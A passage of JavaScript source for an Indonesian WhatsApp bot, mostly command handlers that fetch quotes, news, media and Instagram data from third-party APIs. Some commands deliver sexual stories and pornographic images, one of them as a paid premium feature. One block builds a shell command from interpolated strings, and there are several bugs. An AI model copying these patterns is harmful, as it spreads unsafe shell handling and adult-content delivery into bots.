tidak bisa berubah, diubah, aldiupakan, ataupun di hapus. Masa lalu hanya bisa di terima','Kita ini.. sangat pintar menghakimi, Namun bodoh dalam memperbaiki diri.','Tidak peduli seberapa baiknya kamu, Kebaikan tidak akan berarti apa-apa jika kamu memberikan kepada orang yang salah.','Orang sabar selalu menang, Orang tamak selalu rugi, Orang marah selalu kalah, Orang baik selalu diuji.','Carilah tempat dimana kamu bisa dihargai, Bukan dibutuhkan. Karena banyak orang mencarimu hanya saat butuh saja, Hingga lupa bagaimana cara menghargaimu.','mekupakan orang yang mekukaimu adalah hadiahmu untuk mereka. Memaafkan orang yang mekukaimu adalah hadiahmu untuk dirimu sendiri.','Maafkan orang yang menyakitimu... Bukan karena mereka pantas di maafkan, Tapi karena kamu harus berbahagia.','Tetaplah kuat, Tetaplah positif, Buatlah mereka bertanya-tanya bagaimana kamu masih tetap bisa tersenyum.','Jangan meninggalkan yang pasti demi yang mungkin. Sebab semua kemungkinan, belum tentu menjadi kepastian.','Seseorang pernah berkata padaku, Merelakan bukan berarti menyerah, Tapi tidak bisa dipaksakan.','Ikuti alurnya, Nikmati prosesnya, Tuhan tau kapan kita harus bahagia.','Usia hanyalah angka, Hanya mereka yang terus berusaha yang berhasil.','Jangan pernah meremehkan siapapun! Karena sukses adalah balas dendam Terbaik.','Pria sejati.. Harus menyelesaikan apa yang sudah dimulai.','Jika kau ingin terbang, Kau harus mekepaskan hal-hal yang membuatmu berat.','Siapapun yang meremehkan mu hari ini, Suatu saat harus kamu lewati.','Jangan Mencintai terlalu mudah, Jangan Percaya terlalu cepat, Jangan Berhenti terlalu dini, Jangan Berharap terlalu tinggi, Jangan Bicara terlalu banyak.','Jaaldiah orang baik tapi jangan biarkan orang lain mengambil keuntungan dari mu. Ketahuilah kapan kamu harus bilang tidak.','Sahabat sejati adalah mereka tau semua kelemahan mu, Tapi tidak menggunakan nya untuk menjatuhkan mu.','Ada tiga hal yang harus dimiliki dalam hidup yaitu : Perubahan, Pilihan dan Prinsip.','Orang bodoh mengira dirinya bijak. orang bijak tau dirinya bodoh.','Jatuh cintalah seperlunya.. Kemudian patah hatilah secukupnya. Karena semua ada porsinya, Karena semua ada masanya.','Kita tidak pernah tau jalan hidup seseorang.. Maka ada baiknya jika kita tidak menghakiminya atas keputusan dalam hidupnya.','Jangan pernah menyesal mengenal seseorang dalam hidupmu, Orang baik akan memberi mu Kebahagiaan, Orang jahat akan memberi mu Pengalaman, Bahkan seburuk-buruk manusia akan memberi mu Pelajaran.','Jangan menilai kedewasaan dari usia seseorang, Karena itu bukan jaminan.']
					const nsh = nasehat[Math.floor(Math.random() *   nasehat.length)]
					nase = await getBuffer(`https://i.ibb.co/bspYPtC/IMG-20210125-WA0018.jpg`)
					aldi.sendMessage(from, nase, image, { quoted: fkontak, caption: 'Quotes Nasehat\n\n'+ nsh,contextInfo: { forwardingScore: 508, isForwarded: true}})
					await limitAdd(sender)
					break
             case 'asupan3':  
                     if (!isRegistered) return reply(aml.noregis)
		            if (isBanned) return reply(aml.baned)
                    if (isLimit(sender)) return reply(aml.limitend)
					if (!isGroup) return reply(aml.groupo)
					reply(aml.wait) 
                    anu = await fetchJson(`https://api.xteam.xyz/asupan/lasegar?APIKEY=${xteam}`)
                    anu1 = `➻ NAMA : ${anu.result.username}\n`                                                     
                    anu1 = `➻ USERNAME : ${anu.result.full_name}\n`
                    anu1 += `➻ ID : ${anu.result.profile_id}\n`
                    anu1 += `➻ BIO : ${anu.result.biography}\n`
                    anu1 += `➻ FOLLOWERS : ${anu.result.followers}\n`
                    anu1 += `➻ FOLLOWING : ${anu.result.following}\n`
                    anu1 += `➻ URL : ${anu.result.external_url}\n`
                    anu1 += `➻ PRIVATE : ${anu.result.is_private}\n`
                    anu1 += `➻ VERIFY : ${anu.result.is_verified}\n`
                    anu1 += `➻ TYPE : ${anu.result.type}\n`
                    anu1 += `➻ COMENT : ${anu.result.comment}\n`
                    anu1 += `➻ LIKE : ${anu.result.like}\n`
                    anu1 += `➻ CAPTION : ${anu.result.caption}\n`
                    anu1 += `➻ LINK : ${anu.result.link}\n`
                    anu2 = await getBuffer(anu.result.profile_pic_url_hd)
                    aldi.sendMessage(from, anu2, image, {caption: anu1, quoted: fkontak}).catch(e => {
	                reply('_[ ! ] Error Gagal Dalam Mendownload Dan Mengirim Media_')
                    console.log(e)
	                })
	                await limitAdd(sender)
                    break
          case 'asupan':
			         if (!isRegistered) return reply(aml.noregis)
		            if (isBanned) return reply(aml.baned)
                    if (isLimit(sender)) return reply(aml.limitend)
					if (!isGroup) return reply(aml.groupo)
                    reply('wait sedang menunggu kepastian dari dia')
                    get_result = await fetchJson(`http://api.lolhuman.xyz/api/asupan?apikey=${lolhuman}`)
                    ini_kontol = await getBuffer(get_result.result)
                    aldi.sendMessage(from, ini_kontol, video, { quoted: fkontak, imageMessage: Mimetype.mp4, filename: "asupan.mp4" })
                    await limitAdd(sender)
                    break
		case 'quotescinta':
                    if (!isRegistered) return reply(aml.noregis)
		            if (isBanned) return reply(aml.baned)
                    if (isLimit(sender)) return reply(aml.limitend)
					if (!isGroup) return reply(aml.groupo)
					const cinta =['SABAR MASIH TAHAP PEMBUATAN','MASIH TAHAP PEMBUATAN']
					const cin = cinta[Math.floor(Math.random() *   cinta.length)]
					cta = await getBuffer(`https://i.ibb.co/vL5x6F7/IMG-20210126-WA0018.jpg`)
					aldi.sendMessage(from, cta, image, { quoted: fkontak, caption: 'Quotes Cinta\n\n'+ cin })
					await limitAdd(sender)
					break
		// Movie & Story
                case 'lk21':
                    if (!isRegistered) return reply(aml.noregis)
		            if (isBanned) return reply(aml.baned)
                    if (isLimit(sender)) return reply(aml.limitend)
					if (!isGroup) return reply(aml.groupo)
                    if (args.length == 0) return reply(`Contoh: ${prefix + command} Transformer`)
                    query = args.join('  ')
                    reply(aml.wait) 
                    get_result = await fetchJson(`http://api.lolhuman.xyz/api/lk21?apikey=${lolhuman}&query=${query}`)
                    get_result = get_result.result
                    ini_txt = `Title : ${get_result.title}\n`
                    ini_txt += `Link : ${get_result.link}\n`
                    ini_txt += `Genre : ${get_result.genre}\n`
                    ini_txt += `Views : ${get_result.views}\n`
                    ini_txt += `Duration : ${get_result.duration}\n`
                    ini_txt += `Tahun : ${get_result.tahun}\n`
                    ini_txt += `Rating : ${get_result.rating}\n`
                    ini_txt += `Desc : ${get_result.desc}\n`
                    ini_txt += `Actors : ${get_result.actors.join(", ")}\n`
                    ini_txt += `Location : ${get_result.location}\n`
                    ini_txt += `Date Release : ${get_result.date_release}\n`
                    ini_txt += `Language : ${get_result.language}\n`
                    ini_txt += `Link Download : ${get_result.link_dl}`
                    thumbnail = await getBuffer(get_result.thumbnail)
                    aldi.sendMessage(from, thumbnail, image, { quoted: fkontak, caption: ini_txt })
                    await limitAdd(sender)
                    break
                case 'drakorongoing':
                    if (!isRegistered) return reply(aml.noregis)
		            if (isBanned) return reply(aml.baned)
                    if (isLimit(sender)) return reply(aml.limitend)
					if (!isGroup) return reply(aml.groupo)
                    get_result = await fetchJson(`http://api.lolhuman.xyz/api/drakorongoing?apikey=${lolhuman}`)
                    reply(aml.wait) 
                    get_result = get_result.result
                    ini_txt = "Ongoing Drakor\n\n"
                    for (var x of get_result) {
                        ini_txt += `Title : ${x.title}\n`
                        ini_txt += `Link : ${x.link}\n`
                        ini_txt += `Thumbnail : ${x.thumbnail}\n`
                        ini_txt += `Year : ${x.category}\n`
                        ini_txt += `Total Episode : ${x.total_episode}\n`
                        ini_txt += `Genre : ${x.genre.join(", ")}\n\n`
                    }
                    reply(ini_txt)
                    await limitAdd(sender)
                    break
                    case 'jadwaltv':
                    if (!isRegistered) return reply(aml.noregis)
		            if (isBanned) return reply(aml.baned)
                    if (isLimit(sender)) return reply(aml.limitend)
					if (!isGroup) return reply(aml.groupo)
                    if (args.length == 0) return reply(`Contoh: ${prefix + command} RCTI`)
                    channel = args[0]
                    reply(aml.wait) 
                    get_result = await fetchJson(`http://api.lolhuman.xyz/api/jadwaltv/${channel}?apikey=${lolhuman}`)
                    get_result = get_result.result
                    ini_txt = `Jadwal TV ${channel.toUpperCase()}\n`
                    for (var x in get_result) {
                        ini_txt += `${x} - ${get_result[x]}\n`
                    }
                    reply(ini_txt)
                    await limitAdd(sender)
                    break
                   case 'cersex':
                //[â—] case by DappaGanz
				 if (!isRegistered) returnreply(aml.noregis)
			     if (isLimit(sender)) return reply(aml.limitend)
				 if (isBanned) return reply(aml.baned)            
				reply(aml.wait) 
				anu = await fetchJson(`https://leyscoders-api.herokuapp.com/api/cersex?apikey=${LeysKey}`) 
				kontoler = await getBufferer(anu.gambar)
				sex = `[ CERITA SEX ]\n\n\nCerita : ${anu.result}`
				aldi.sendMessage(from, kontoler, image, {quoted: ftoko, caption: sex})
				await limitAdd(sender)
				break
				case 'cersexsearch':
                //[â—] case by DappaGanz 
                 if (!isRegistered) return reply(aml.noregis)
					if (isLimit(sender)) return reply(aml.limitend)
				    if (isBanned) return reply(aml.baned)            
                judul = args.join('  ')
				reply(aml.wait) 
				anu = await fetchJson(`https://leyscoders-api.herokuapp.com/api/cersex-search?q=${judul}&apikey=${LeysKey}`)
				teks = '=================\n'
				for (let i of anu.result) {
				teks += `[ CERITA SEX SEARCH ]\n\n\nUrl : ${i.url}\nTitle : ${i.title}\nImage : ${i.img}\nCategory : ${i.category}\nPost : ${i.post}\n=================\n`
				}
				reply(teks.trim())
				await limitAdd(sender)
				break
                case 'gsmarena':
                //[â—] case by DappaGanz
        	     if (!isRegistered) returnreply(aml.noregis)
					if (isLimit(sender)) return reply(aml.limitend)
				    if (isBanned) return reply(aml.baned)            
                if (args.length < 1) return reply(`apa yang mau dicari ngab?\ncontoh ${prefix + command} iphone`)
                dpzz = args.join('  ')
                reply(aml.wait) 
        	    halah = await fetchJson(`https://leyscoders-api.herokuapp.com/api/gsm-arena?q=${dpzz}&apikey=${LeysKey}`)
        	    asu = halah.result
        	    img = await getBufferer(asu.thumb)
        	    hsil = `Nama : ${asu.spek}\n`
        	    hsil += `Type : ${asu.display_type}\n`
        	    hsil += `Size : ${asu.display_size}\n`
        	    hsil += `Resolusi : ${asu.display_resolusi}\n`
        	    hsil += `Chipset : ${asu.chipset}\n`
        	    hsil += `Os : ${asu.os}\n`
        	    hsil += `Cpu : ${asu.cpu}\n`
        	    hsil += `Internal : ${asu.internal}\n`
        	    hsil += `Camera : ${asu.camera}\n`
        	    hsil += `Batterai : ${asu.Batterai}`
        	    aldi.sendMessage(from, img, image, {quoted: ftoko, caption: hsil})
        	    await limitAdd(sender)
        	    break
                case 'sfile':
                //[â—] case by DappaGanz
                 if (!isRegistered) return reply(aml.noregis)
					if (isLimit(sender)) return reply(aml.limitend)
				    if (isBanned) return reply(aml.baned)            
				if (args.length < 1) return reply(`apa yang mau dicari ngab?\ncontoh ${prefix + command} config pubg`)
				reply(aml.wait) 
				dpganzz = args.join('  ')
				anu = await fetchJson(`https://leyscoders-api.herokuapp.com/api/sfile?q=${dpganzz}&apikey=${LeysKey}`)
				teks = '=================\n'
				for (let i of anu.result) {
				teks += `Title : ${i.title}\nSize : ${i.size}\nUrl : ${i.url}\n=================\n`
				}
				reply(teks.trim())
				await limitAdd(sender)
				break
                case 'jalantikus':
                //[â—] case by DappaGanz
                 if (!isRegistered) return reply(aml.noregis)
					if (isLimit(sender)) return reply(aml.limitend)
				    if (isBanned) return reply(aml.baned)            
				if (args.length < 1) return reply(`apa yang mau dicari ngab?\ncontoh ${prefix + command} whatsapp`)
				reply(aml.wait) 
				dpganzz = args.join('  ')
				anu = await fetchJson(`https://leyscoders-api.herokuapp.com/api/jalantikus?q=${dpganzz}&apikey=${LeysKey}`)
				teks = '=================\n'
				for (let i of anu.result) {
				teks += `Title : ${i.title}\nImage : ${i.img}\nUrl : ${i.url}\n=================\n`
				}
				reply(teks.trim())
				await limitAdd(sender)
				break
				case 'muihalal':
                //[â—] case by DappaGanz
                 if (!isRegistered) return reply(aml.noregis)
					if (isLimit(sender)) return reply(aml.limitend)
				    if (isBanned) return reply(aml.baned)            
				if (args.length < 1) return reply(`apa yang mau dicari ngab?\ncontoh ${prefix + command} sabun`)
				reply(aml.wait) 
				dpganzz = args.join('  ')
				anu = await fetchJson(`https://leyscoders-api.herokuapp.com/api/halal?q=${dpganzz}&apikey=${LeysKey}`)
				teks = '=================\n'
				for (let i of anu.result) {
				teks += `Hasil : ${i.hasil}\n=================\n`
				}
				reply(teks.trim())
				await limitAdd(sender)
				break
				case 'thelazy':
                //[â—] case by DappaGanz
                 if (!isRegistered) return reply(aml.noregis)
					if (isLimit(sender)) return reply(aml.limitend)
				    if (isBanned) return reply(aml.baned)            
				if (args.length < 1) return reply(`apa yang mau dicari ngab?\ncontoh ${prefix + command} game`)
				reply(aml.wait) 
				dpganzz = args.join('  ')
				anu = await fetchJson(`https://leyscoders-api.herokuapp.com/api/thelazy?q=${dpganzz}&apikey=${LeysKey}`)
				teks = '=================\n'
				for (let i of anu.result) {
				teks += `Title : ${i.title}\nCategory : ${i.category}\nAuthor : ${i.author}\nPost Date : ${i.post_date}\nComments : ${i.comments}\nImage : ${i.img}\nUrl : ${i.url}\n=================\n`
				}
				reply(teks.trim())
				await limitAdd(sender)
				break
				case 'wattpad':
                //[â—] case by DappaGanz
                if (!isRegistered) return reply(aml.noregis)
			    if (isLimit(sender)) return reply(aml.limitend)
				if (isBanned) return reply(aml.baned)            
				if (args.length < 1) return reply(`apa yang mau dicari ngab?\ncontoh ${prefix + command} tere liye`)
				reply(aml.wait) 
				dpganzz = args.join('  ')
				anu = await fetchJson(`https://leyscoders-api.herokuapp.com/api/wattpad-search?q=${dpganzz}&apikey=${LeysKey}`)
				teks = '=================\n'
				for (let i of anu.result) {
				teks += `Title : ${i.title}\nId : ${i.id}\nThumb : ${i.thumb}\nUrl : ${i.url}\n=================\n`
				}
				reply(teks.trim())
				await limitAdd(sender)
				break
				case 'rexdl':
                //[â—] case by DappaGanz
                if (!isRegistered) return reply(aml.noregis)
		        if (isLimit(sender)) return reply(aml.limitend)
			    if (isBanned) return reply(aml.baned)            
				if (args.length < 1) return reply(`apa yang mau dicari ngab?\ncontoh ${prefix + command} subway surf`)
				reply(aml.wait) 
				dpganzz = args.join('  ')
				anu = await fetchJson(`https://leyscoders-api.herokuapp.com/api/rexdl-search?q=${dpganzz}&apikey=${LeysKey}`)
				teks = '=================\n'
				for (let i of anu.result) {
				teks += `Title : ${i.title}\nUpdate On : ${i.update_on}\nDeskripsi : ${i.desc}\nImage : ${i.img}\nUrl : ${i.url}\n=================\n`
				}
				reply(teks.trim())
				await limitAdd(sender)
				break
                case 'jadwaltvnow':
                     if (!isRegistered) return reply(aml.noregis)
					if (isLimit(sender)) return reply(aml.limitend)
				    if (isBanned) return reply(aml.baned)            
                    get_result = await fetchJson(`http://api.lolhuman.xyz/api/jadwaltv/now?apikey=${lolhuman}`)
                    get_result = get_result.result
                    ini_txt = `Jadwal TV Now :\n`
                    for (var x in get_result) {
                        ini_txt += `${x.toUpperCase()}${get_result[x]}\n\n`
                    }
                    reply(ini_txt)
                    break
                case 'newsinfo':
                     if (!isRegistered) return reply(aml.noregis)
					if (isLimit(sender)) return reply(aml.limitend)
				    if (isBanned) return reply(aml.baned)            
                    get_result = await fetchJson(`http://api.lolhuman.xyz/api/newsinfo?apikey=${lolhuman}`)
                    get_result = get_result.result
                    ini_txt = "Result :\n"
                    for (var x of get_result) {
                        ini_txt += `Title : ${x.title}\n`
                        ini_txt += `Author : ${x.author}\n`
                        ini_txt += `Source : ${x.source.name}\n`
                        ini_txt += `Url : ${x.url}\n`
                        ini_txt += `Published : ${x.publishedAt}\n`
                        ini_txt += `Description : ${x.description}\n\n`
                    }
                    reply(ini_txt)
                    break
                case 'cnnindonesia':
                 if (!isRegistered) return reply(aml.noregis)
					if (isLimit(sender)) return reply(aml.limitend)
				    if (isBanned) return reply(aml.baned)            
                    get_result = await fetchJson(`http://api.lolhuman.xyz/api/cnnindonesia?apikey=${lolhuman}`)
                    get_result = get_result.result
                    ini_txt = "Result :\n"
                    for (var x of get_result) {
                        ini_txt += `Judul : ${x.judul}\n`
                        ini_txt += `Link : ${x.link}\n`
                        ini_txt += `Tipe : ${x.tipe}\n`
                        ini_txt += `Published : ${x.waktu}\n\n`
                    }
                    reply(ini_txt)
                    break
                case 'cnnnasional':
                    if (!isRegistered) return reply(aml.noregis)
					if (isLimit(sender)) return reply(aml.limitend)
				    if (isBanned) return reply(aml.baned)            
                    get_result = await fetchJson(`http://api.lolhuman.xyz/api/cnnindonesia/nasional?apikey=${lolhuman}`)
                    get_result = get_result.result
                    ini_txt = "Result :\n"
                    for (var x of get_result) {
                        ini_txt += `Judul : ${x.judul}\n`
                        ini_txt += `Link : ${x.link}\n`
                        ini_txt += `Tipe : ${x.tipe}\n`
                        ini_txt += `Published : ${x.waktu}\n\n`
                    }
                    reply(ini_txt)
                    break
                case 'cnninternasional':
                    if (!isRegistered) return reply(aml.noregis)
					if (isLimit(sender)) return reply(aml.limitend)
				    if (isBanned) return reply(aml.baned)            
                    get_result = await fetchJson(`http://api.lolhuman.xyz/api/cnnindonesia/internasional?apikey=${lolhuman}`)
                    get_result = get_result.result
                    ini_txt = "Result :\n"
                    for (var x of get_result) {
                        ini_txt += `Judul : ${x.judul}\n`
                        ini_txt += `Link : ${x.link}\n`
                        ini_txt += `Tipe : ${x.tipe}\n`
                        ini_txt += `Published : ${x.waktu}\n\n`
                    }
                    reply(ini_txt)
                    break
                case 'infogempa':
                     if (!isRegistered) return reply(aml.noregis)
					if (isLimit(sender)) return reply(aml.limitend)
				    if (isBanned) return reply(aml.baned)            
                    get_result = await fetchJson(`http://api.lolhuman.xyz/api/infogempa?apikey=${lolhuman}`)
                    get_result = get_result.result
                    ini_txt = `Lokasi : ${get_result.lokasi}\n`
                    ini_txt += `Waktu : ${get_result.waktu}\n`
                    ini_txt += `Potensi : ${get_result.potensi}\n`
                    ini_txt += `Magnitude : ${get_result.magnitude}\n`
                    ini_txt += `Kedalaman : ${get_result.kedalaman}\n`
                    ini_txt += `Koordinat : ${get_result.koordinat}`
                    get_kontol = await getBuffer(get_result.map)
                    aldi.sendMessage(from, get_kontol, image, { quoted: fkontak, caption: ini_txt })
                    break
                 case 'telesticker':
                  if (!isRegistered) return reply(aml.noregis)
					if (isLimit(sender)) return reply(aml.limitend)
				    if (isBanned) return reply(aml.baned)            
                    if (args.length == 0) return reply(`Contoh: ${prefix + command} https://t.me/addstickers/LINE_Menhera_chan_ENG`)
                    ini_url = args[0]
                    ini_url = await fetchJson(`http://api.lolhuman.xyz/api/telestick?apikey=${lolhuman}&url=${ini_url}`)
                    ini_sticker = ini_url.result.sticker
                    for (sticker_ in ini_sticker) {
                        ini_kontol = await getBuffer(ini_sticker[sticker_])
                        aldi.sendMessage(from, ini_kontol, sticker)
                    }
                    break
             case 'igphoto':
              if (!isRegistered) return reply(aml.noregis)
					if (isLimit(sender)) return reply(aml.limitend)
				    if (isBanned) return reply(aml.baned)            
                reply(aml.wait)
                try {
                    await searchUser(argz).then((us) => {
                        let searchigcapt = `*Hasil pencarian insta from ${argz}*\n\n`
                        for (let i = 0; i < us.length; i++) {
                            searchigcapt += `
◼️ *Urutan* : ${us[i].number}
◼️ *Username* : ${us[i].username}
◼️ *Nama Lengkap* : ${us[i].name}
◼️ *Id Story Terbaru* : ${us[i].latest_reel}
◼️ *Terverifikasi* : ${us[i].is_verified ? "✅" : "❌"}
◼️ *Akun Private* : ${us[i].is_private ? "✅" : "❌"}
                        `
                        }
                        aldi.sendMessage(from, us[0].pic, searchigcapt, image, {quoted: mek})
                    })
                } catch (err){
                    console.log(color('[IG SEARCH]', 'red'), err)
                    reply(`Error kami akan memperbaikin nya secepatnya`)
                }
                break
                await limitAdd(sender)
                break
           case 'igvideo':
                 if (!isRegistered) return reply(aml.noregis)
			     if (isLimit(sender)) return reply(aml.limitend)
				 if (isBanned) return reply(aml.baned)            
				if (!q) return reply('_*Masukan link ig*_')
				if(!isUrl(args[0]) && !args[0].includes('www.instagram.com')) return reply('Masukan link ig dgn benar')
				reply(aml.wait)
				anu = videoIg(q).catch(e => {
				reply('Terjadi kesalahan kami akan memperbaikin nya secepatnya')
				})
				igvid = `Data berhasil dipatkan`
				test = await getBuffer(anu[0].url)
				aldi.sendMessage(from, test, video, {mimetype: 'video/mp4', quoted: mek})
                await limitAdd(sender)
                break
                case 'bokep':
				aldi.updatePresence(from, Presence.composing) 
				 if (!isPrem) return reply(`Perintah ini hanya khusus Premium Ketik ${prefix}owner Untuk Membeli Premium`)
				 data = fs.readFileSync('./src/18.js');
                 jsonData = JSON.parse(data);
                 randIndex = Math.floor(Math.random() * jsonData.length);
                 randKey = jsonData[randIndex];
                 randBokep = await getBuffer(randKey.image)
                 reply(aml.wait)
                 randTeks = randKey.teks
                 aldi.sendMessage(from, randBokep, image, {quoted: ftoko, caption: randTeks})
				break       
                //case 'ngif':
               // case 'nsfwnekogif':
              //  case 'randomhentaigif':
                    ranp = getRandom('.gif')
                    rano = getRandom('.webp')
                    ini_kontol = `http://api.lolhuman.xyz/api/random2/${command}?apikey=${lolhuman}`
                    exec(`wget ${ini_kontol} -O ${ranp} && ffmpeg -i ${ranp} -vcodec libwebp -filter:v fps=fps=15 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${rano}`, (err) => {
                        fs.unlinkSync(ranp)
                        kontol = fs.readFileSync(rano)
                        aldi.sendMessage(from, kontol, sticker, { quoted: fkontak })
                        fs.unlinkSync(rano)
                    })
                    await limitAdd(sender)
                    break
                case 'spotify':
                    if (!isRegistered) return reply(aml.noregis)
					if (isLimit(sender)) return reply(aml.limitend)
				    if (isBanned) return reply(aml.baned)            
                    if (args.length == 0) return reply(`Contoh: ${prefix + command} https://open.spotify.com/track/0ZEYRVISCaqz5yamWZWzaA`)
                    url = args[0]
                    reply (aml.wait)
                    get_result = await fetchJson(`http://api.lolhuman.xyz/api/spotify?apikey=${lolhuman}&url=${url}`)
                    get_result = get_result.result
                    ini_txt = `Title : ${get_result.title}\n`
                    ini_txt += `Artists : ${get_result.artists}\n`
                    ini_txt += `Duration : ${get_result.duration}\n`
                    ini_txt += `Popularity : ${get_result.popularity}\n`
                    ini_txt += `Preview : ${get_result.preview_url}\n`
                    thumbnail = await getBuffer(get_result.thumbnail)
                    aldi.sendMessage(from, thumbnail, image, { quoted: fkontak, caption: ini_txt })
                    get_audio = await getBuffer(get_result.link[3].link)
                    aldi.sendMessage(from, get_audio, audio, { mimetype: 'audio/mp4', filename: `${get_result.title}.mp3`, quoted: fkontak })
                    await limitAdd(sender)
                    break
                case 'spotifysearch':
                       if (!isRegistered) return reply(aml.noregis)
					    if (isLimit(sender)) return reply(aml.limitend)
				        if (isBanned) return reply(aml.baned)            
                        if (args.length == 0) return reply(`Contoh: ${prefix + command} mekukis Senja`)
                        query = args.join('  ')
                        reply (aml.wait)
                        get_result = await fetchJson(`http://api.lolhuman.xyz/api/spotifysearch?apikey=${lolhuman}&query=${query}`)
                        get_result = get_result.result
                        ini_txt = ""
                        for (var x of get_result) {
                        ini_txt += `Title : ${x.title}\n`
                        ini_txt += `Artists : ${x.artists}\n`
                        ini_txt += `Duration : ${x.duration}\n`
                        ini_txt += `Link : ${x.link}\n`
                        ini_txt += `Preview : ${x.preview_url}\n\n\n`
                    }
                    reply(ini_txt)
                    await limitAdd(sender)
                    break
          case 'jooxplay':
                    if (!isRegistered) return reply(aml.noregis)
					if (isLimit(sender)) return reply(aml.limitend)
				    if (isBanned) return reply(aml.baned)            
                    if (args.length == 0) return reply(`Contoh: ${prefix + command} mekukis Senja`)
                    query = args.join('  ')
                    reply (aml.wait)
                    get_result = await fetchJson(`http://api.lolhuman.xyz/api/jooxplay?apikey=${lolhuman}&query=${query}`)
                    get_result = get_result.result
                    ini_txt = `Title : ${get_result.info.song}\n`
                    ini_txt += `Artists : ${get_result.info.singer}\n`
                    ini_txt += `Duration : ${get_result.info.duration}\n`
                    ini_txt += `Album : ${get_result.info.album}\n`
                    ini_txt += `Uploaded : ${get_result.info.date}\n`
                    ini_txt += `Lirik :\n ${get_result.lirik}\n`
                    thumbnail = await getBuffer(get_result.image)
                    aldi.sendMessage(from, thumbnail, image, { quoted: fkontak, caption: ini_txt })
                    get_audio = await getBuffer(get_result.audio[0].link)
                    aldi.sendMessage(from, get_audio, audio, { mimetype: 'audio/mp4', filename: `${get_result.info.song}.mp3`, quoted: fkontak })
                    await limitAdd(sender)
                    break
           case 'igdl':
                    if (!isRegistered) return reply(aml.noregis)
					if (isLimit(sender)) return reply(aml.limitend)
				    if (isBanned) return reply(aml.baned)                             
                    if (!q) return reply('Linknya?')
                    reply(aml.wait)
                    igdl.fetchPost(`${q}`).then(res => {
                    asu = res.links[0]
                    var { username,name, caption} = res
                    console.log(asu)
                    aldi.sendMessage(from,`${asu.url}`, `Username : ${username}
                    Name : ${name}
                    Caption : ${caption}`)
                              })
                        break    
            case 'zippyshare':
                    if (!isRegistered) return reply(aml.noregis)
					if (isLimit(sender)) return reply(aml.limitend)
				    if (isBanned) return reply(aml.baned)            
                    if (args.length == 0) return reply(`Contoh: ${prefix + command} https://www51.zippyshare.com/v/5W0TOBz1/file.html`)
                    ini_url = args[0]
                    reply (aml.wait)
                    ini_url = await fetchJson(`http://api.lolhuman.xyz/api/zippyshare?apikey=${lolhuman}&url=${ini_url}`)
                    ini_url = ini_url.result
                    ini_txt = `File Name : ${ini_url.name_file}\n`
                    ini_txt += `Size : ${ini_url.size}\n`
                    ini_txt += `Date Upload : ${ini_url.date_upload}\n`
                    ini_txt += `Download Url : ${ini_url.download_url}`
                    reply(ini_txt)
                    await limitAdd(sender)
                     break
            case 'pinterest':
                    if (!isRegistered) return reply(aml.noregis)
					if (isLimit(sender)) return reply(aml.limitend)
				    if (isBanned) return reply(aml.baned)            
				    aldi.updatePresence(from, Presence.composing) 
				cari = args.join('  ')
				reply(aml.wait)
				anu = await fetchJson(`https://api.lolhuman.xyz/api/pinterest2?apikey=${lolhuman}&query=${cari}`)
				var dapp = JSON.parse(JSON.stringify(anu.result))
				var pa =  dapp[Math.floor(Math.random() * dapp.length)]
				uhy = await getBuffer(pa)
				aldi.sendMessage(from, uhy, image, {quoted: fkontak})
				await limitAdd(sender)
				break
				    await limitAdd(sender)
				    break
                case 'pinterestdl':
                    if (!isRegistered) return reply(aml.noregis)
					if (isLimit(sender)) return reply(aml.limitend)
				    if (isBanned) return reply(aml.baned)            
                    if (args.length == 0) return reply(`Contoh: ${prefix + command} https://id.pinterest.com/pin/696580267364426905/`)
                    ini_url = args[0]
                    ini_url = await fetchJson(`http://api.lolhuman.xyz/api/pinterestdl?apikey=${lolhuman}&url=${ini_url}`)
                    ini_url = ini_url.result[0]
                    ini_kontol = await getBuffer(ini_url)
                    aldi.sendMessage(from, ini_kontol, image, { quoted: fkontak })
                    await limitAdd(sender)
                    break
              case 'wattpad':
                   if (!isRegistered) return reply(aml.noregis)
					if (isLimit(sender)) return reply(aml.limitend)
				    if (isBanned) return reply(aml.baned)            
                    if (args.length == 0) return reply(`Contoh: ${prefix + command} https://www.wattpad.com/707367860-kumpulan-quote-tere-liye-tere-liye-quote-quote`)
                    ini_url = args[0]
                    get_result = await fetchJson(`http://api.lolhuman.xyz/api/wattpad?apikey=${lolhuman}&url=${ini_url}`)
                    get_result = get_result.result
                    ini_txt = `Title : ${get_result.title}\n`
                    ini_txt += `Rating : ${get_result.rating}\n`
                    ini_txt += `Motify date : ${get_result.modifyDate}\n`
                    ini_txt += `Create date: ${get_result.createDate}\n`
                    ini_txt += `Word : ${get_result.word}\n`
                    ini_txt += `Comment : ${get_result.comment}\n`
                    ini_txt += `Vote : ${get_result.vote}\n`
                    ini_txt += `Reader : ${get_result.reader}\n`
                    ini_txt += `Pages : ${get_result.pages}\n`
                    ini_txt += `Description : ${get_result.desc}\n\n`
                    ini_txt += `Story : \n${get_result.story}`
                    thumbnail = await getBuffer(get_result.photo)
                    aldi.sendMessage(from, thumbnail, image, { quoted: fkontak, caption: ini_txt })
                    break
              case 'wattpadsearch':
                    if (!isRegistered) return reply(aml.noregis)
					if (isLimit(sender)) return reply(aml.limitend)
				    if (isBanned) return reply(aml.baned)
                    if (args.length == 0) return reply(`Contoh: ${prefix + command} Tere Liye`)
                    query = args.join('  ')
                    get_result = await fetchJson(`http://api.lolhuman.xyz/api/wattpadsearch?apikey=${LolApi}&query=${query}`)
                    get_result = get_result.result
                    ini_txt = "Wattpad Seach : \n"
                    for (var x of get_result) {
                        ini_txt += `Title : ${x.title}\n`
                        ini_txt += `Url : ${x.url}\n`
                        ini_txt += `Part : ${x.parts}\n`
                        ini_txt += `Motify date : ${x.modifyDate}\n`
                        ini_txt += `Create date: ${x.createDate}\n`
                        ini_txt += `Coment count: ${x.commentCount}\n\n`
                    }
                    reply(ini_txt)
                    break
                case 'cerpen':
                    if (!isRegistered) return reply(aml.noregis)
					if (isLimit(sender)) return reply(aml.limitend)
				    if (isBanned) return reply(aml.baned)
                    get_result = await fetchJson(`http://api.lolhuman.xyz/api/cerpen?apikey=${lolhuman}`)
                    get_result = get_result.result
                    ini_txt = `Title : ${get_result.title}\n`
                    ini_txt += `Creator : ${get_result.creator}\n`
                    ini_txt += `Story :\n${get_result.cerpen}`
                    reply(ini_txt)
                    break
                case 'ceritahoror':
                    if (!isRegistered) return reply(aml.noregis)
					if (isLimit(sender)) return reply(aml.limitend)
				    if (isBanned) return reply(aml.baned)
                    get_result = await fetchJson(`http://api.lolhuman.xyz/api/ceritahoror?apikey=${lolhuman}`)
                    get_result = get_result.result
                    ini_txt = `Title : ${get_result.title}\n`
